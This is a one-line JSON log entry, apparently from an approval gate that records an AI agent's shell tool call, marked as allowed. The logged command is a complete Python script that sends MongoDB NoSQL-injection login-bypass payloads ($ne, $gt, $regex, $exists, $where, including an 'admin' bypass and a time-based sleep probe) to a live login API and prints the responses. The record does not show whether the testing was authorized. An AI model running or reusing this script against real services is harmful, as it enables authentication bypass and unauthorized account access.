{"ts": 1790638379.23774, "decision_id": "9fe8e75ffa11", "tool": "run_shell", "allow": true, "reason": null, "target": "python3 << 'EOF'\nimport requests\nimport json\n\nurl = \"https://duck-store.escape.tech/api/v1/auth/login\"\nheaders = {\"Content-Type\": \"application/json\"}\n\n# Test NoSQL injection payloads\npayloads = [\n    # MongoDB authentication bypass\n    {\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}},\n    {\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}},\n    {\"username\": {\"$regex\": \".*\"}, \"password\": {\"$regex\": \".*\"}},\n    {\"username\": {\"$exists\": True}, \"password\": {\"$exists\": True}},\n    {\"username\": \"admin\", \"password\": {\"$ne\": \"\"}},\n    {\"username\": \"aut-a\", \"password\": {\"$ne\": \"\"}},\n    {\"$where\": \"this.username == this.password\"},\n    # Time-based\n    {\"username\": \"test\", \"password\": {\"$where\": \"sleep(5000) || true\"}},\n]\n\nbaseline = requests.post(url, headers=headers, json={\"username\": \"test\", \"password\": \"test\"})\nprint(f\"Baseline: {baseline.status_code} - {baseline.text[:100]}\")\n\nfor i, payload in enumerate(payloads):\n    try:\n        r = requests.post(url, headers=headers, json=payload, timeout=10)\n        print(f\"Payload {i}: {json.dumps(payload)} -> {r.status_code} - {r.text[:150]}\")\n    except Exception as e:\n        print(f\"Payload {i}: ERROR - {e}\")\nEOF"}
